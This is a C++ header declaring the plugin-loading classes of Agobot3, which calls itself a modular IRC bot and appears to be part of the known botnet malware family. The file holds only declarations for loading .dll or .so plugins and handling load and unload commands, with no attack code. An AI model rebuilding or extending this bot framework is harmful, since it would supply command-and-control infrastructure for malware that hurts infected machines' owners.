/*	Agobot3 - a modular IRC bot for Win32 / Linux
	Copyright (c) 2004 Ago and the Agobot team
	All rights reserved.

	This is private software, you may redistribute it under the terms of
	the APL(Ago's Private License) which follows:
  
	Redistribution and use in binary forms, with or without modification,
	are permitted provided that the following conditions are met:
	1. The name of the author may not be used to endorse or promote products
	   derived from this software without specific prior written permission.
	2. The binary and source may not be sold and/or given away for free.
	3. The licensee may only create binaries for his own usage, not for any
	   third parties.
	4. The person using this sourcecode is a developer of said sourcecode.

	Redistribution and use in source forms, with or without modification,
	are not permitted.

	This license may be changed without prior notice.

	THIS SOFTWARE IS PROVIDED BY THE AUTHOR ``AS IS'' AND ANY EXPRESS OR
	IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES
	OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED.
	IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT, INDIRECT,
	INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT
	NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
	DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
	THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
	(INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
	THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE. */

#ifndef __CPLUGIN_H__
#define __CPLUGIN_H__

#include "cvar.h"
#include "commands.h"
#include "message.h"
#include "irc.h"

class CPlugin;
class CPluginLoader;

typedef bool (*InitFunc)(void *pMainCtrl, CPlugin *pPlugin);
typedef void (*ShutdownFunc)();
typedef bool (*HandleCommandFunc)(CMessage *pMsg);

class CPlugin : public CCommandHandler
{
public:
						 CPlugin();						// Constructor
	virtual				~CPlugin();						// Destructor

	bool				 Load(CString &sFilename);		// Load a plugin
	void				 Unload();						// Unload this plugin
	bool				 Init();						// Initialize this plugin
	bool				 HandleCommand(CMessage *pMsg);	// Distribute a command to this plugin
private:
#ifdef WIN32
	HMODULE				 m_hPlugin;						// The handle to the .dll file
#else
	void				*m_hPlugin;						// The handle to the .so file
#endif // WIN32

	InitFunc			 m_pfnInit;						// Pointer to plugins Init() function
	ShutdownFunc		 m_pfnShutdown;					// Pointer to plugins Shutdown() function
	HandleCommandFunc	 m_pfnHandleCommand;			// Pointer to plugins HandleCommand() function
};

class CPluginLoader : public CCommandHandler
{
public:
						 CPluginLoader();				// Constructor
	virtual				~CPluginLoader();				// Destructor

	bool				 HandleCommand(CMessage *pMsg);	// Command handler

	CommandInfo				 m_cmdLoad, m_cmdUnload;		// Commands
	bool				 Init();						// Initialization
};

#endif // __CPLUGIN_H__
